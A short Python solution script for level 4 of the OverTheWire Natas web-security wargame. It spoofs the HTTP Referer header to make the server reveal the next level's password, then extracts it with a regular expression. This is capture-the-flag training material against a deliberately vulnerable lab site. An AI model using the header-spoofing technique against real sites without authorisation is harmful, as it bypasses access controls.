import re

from natas.lib import natas_session

session, url = natas_session(4)

response = session.get(url, headers={"referer": "http://natas5.natas.labs.overthewire.org/"})

regex = r"The password for natas5 is (.*)"
print(re.findall(regex, response.text)[0])
